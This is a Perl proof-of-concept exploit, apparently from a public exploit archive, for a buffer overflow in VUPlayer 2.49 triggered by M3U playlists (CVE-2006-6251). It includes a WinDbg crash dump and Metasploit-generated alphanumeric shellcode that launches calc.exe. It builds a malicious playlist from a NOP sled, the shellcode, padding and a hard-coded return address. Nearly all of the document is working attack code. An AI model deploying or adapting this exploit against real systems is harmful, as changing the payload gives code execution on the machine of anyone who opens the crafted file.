#!/usr/bin/perl
#
# Title: VUPlayer 2.49 M3U Playlist File Remote Buffer Overflow Exploit
#
# Summary: VUPlayer is a freeware multi-format audio player for Windows
#
# Product web page: http://www.vuplayer.com/vuplayer.php
#
# Desc: VUPlayer 2.49 suffers from buffer overflow vulnerability that can be
# exploited remotely using user intereaction or crafting. It fails to perform
# adequate boundry condition of the user input file (1016 bytes), allowing us
# to overwrite the EIP, ECX and EBP registers. Successful exploitation executes
# calc.exe, failed  attempt resolve in DoS.
#
#
# ---------------------------------WinDbg-------------------------------------
#
# (e7c.c40): Access violation - code c0000005 (first chance)
# First chance exceptions are reported before any exception handling.
# This exception may be expected and handled.
# eax=00000000 ebx=00000001 ecx=41414141 edx=00da5c98 esi=0050b460 edi=0012ee24
# eip=41414141 esp=0012eab8 ebp=41414141 iopl=0         nv up ei pl zr na pe nc
# cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00210246
# 41414141 ??              ???
#
# ----------------------------------------------------------------------------
#
#
# Tested on Microsoft Windows XP Professional SP2 (English)
#
# Vulnerability discovered by Greg Linares & Expanders in version 2.44 (2006)
#
# Refs:
#
# - cVE: CVE-2006-6251
# - MILW0RM:2872
# - MILW0RM:2870
# - CERT-VN:VU#311192
# - BID:21363
# - FRSIRT:ADV-2006-4783
# - SECUNIA:23182
# - XF:vuplayer-plsm3u-bo(30629)
#
# Exploit coded by Gjoko 'LiquidWorm' Krstic
#
# liquidworm [t00t] gmail.com
#
# http://www.zeroscience.org
#
# 18.08.2008
#


print "\n\n";
print "=" x 80;
print "\n\n";
print "\tVUPlayer 2.49 M3U Playlist File Remote Buffer Overflow Exploit\n";
print "\t\t by LiquidWorm <liquidworm [at] gmail.com>\n\n\n";
print "=" x 80;

# win32_exec -  EXITFUNC=thread CMD=calc.exe Size=351 Encoder=PexAlphaNum http://metasploit.com

$SHELLCODE = "\xeb\x03\x59\xeb\x05\xe8\xf8\xff\xff\xff".
	     "\x4f\x49\x49\x49\x49\x49\x49\x51\x5a\x56".
	     "\x54\x58\x36\x33\x30\x56\x58\x34\x41\x30".
	     "\x42\x36\x48\x48\x30\x42\x33\x30\x42\x43".
	     "\x56\x58\x32\x42\x44\x42\x48\x34\x41\x32".
	     "\x41\x44\x30\x41\x44\x54\x42\x44\x51\x42".
	     "\x30\x41\x44\x41\x56\x58\x34\x5a\x38\x42".
	     "\x44\x4a\x4f\x4d\x4e\x4f\x4a\x4e\x46\x34".
	     "\x42\x30\x42\x30\x42\x50\x4b\x48\x45\x34".
	     "\x4e\x43\x4b\x58\x4e\x57\x45\x30\x4a\x57".
	     "\x41\x50\x4f\x4e\x4b\x58\x4f\x54\x4a\x31".
	     "\x4b\x58\x4f\x45\x42\x52\x41\x30\x4b\x4e".
	     "\x49\x54\x4b\x48\x46\x53\x4b\x38\x41\x30".
	     "\x50\x4e\x41\x53\x42\x4c\x49\x49\x4e\x4a".
	     "\x46\x38\x42\x4c\x46\x37\x47\x50\x41\x4c".
	     "\x4c\x4c\x4d\x50\x41\x50\x44\x4c\x4b\x4e".
	     "\x46\x4f\x4b\x53\x46\x45\x46\x32\x46\x50".
	     "\x45\x57\x45\x4e\x4b\x38\x4f\x55\x46\x52".
	     "\x41\x30\x4b\x4e\x48\x36\x4b\x58\x4e\x30".
	     "\x4b\x54\x4b\x58\x4f\x55\x4e\x51\x41\x50".
	     "\x4b\x4e\x4b\x38\x4e\x51\x4b\x38\x41\x30".
	     "\x4b\x4e\x49\x38\x4e\x35\x46\x52\x46\x30".
	     "\x43\x4c\x41\x33\x42\x4c\x46\x36\x4b\x38".
	     "\x42\x54\x42\x53\x45\x58\x42\x4c\x4a\x37".
	     "\x4e\x50\x4b\x58\x42\x34\x4e\x30\x4b\x58".
	     "\x42\x47\x4e\x31\x4d\x4a\x4b\x48\x4a\x36".
	     "\x4a\x30\x4b\x4e\x49\x50\x4b\x38\x42\x38".
	     "\x42\x4b\x42\x50\x42\x50\x42\x30\x4b\x38".
	     "\x4a\x36\x4e\x53\x4f\x55\x41\x53\x48\x4f".
	     "\x42\x46\x48\x35\x49\x48\x4a\x4f\x43\x38".
	     "\x42\x4c\x4b\x57\x42\x35\x4a\x36\x4f\x4e".
	     "\x50\x4c\x42\x4e\x42\x56\x4a\x56\x4a\x39".
	     "\x50\x4f\x4c\x48\x50\x50\x47\x35\x4f\x4f".
	     "\x47\x4e\x43\x36\x41\x56\x4e\x36\x43\x36".
	     "\x50\x32\x45\x36\x4a\x57\x45\x46\x42\x50".
	     "\x5a";


$FILE = "TETOVIRANJE.m3u";

$GARBAGE = "\x4A" x 461; 

$NOPSLED = "\x90" x 200;

$RET = "\xC0\xE6\x12\x00";

print "\n\n[-] Buffering malicious playlist file. Please wait...\r\n";

sleep (5);

open (BOF, ">./$FILE") || die "\nCan't open $FILE: $!";

print BOF "$NOPSLED" . "$SHELLCODE" . "$GARBAGE" . "$RET";

close (BOF);

print "\n\n[+] File $FILE successfully created!\n\n";

system (pause);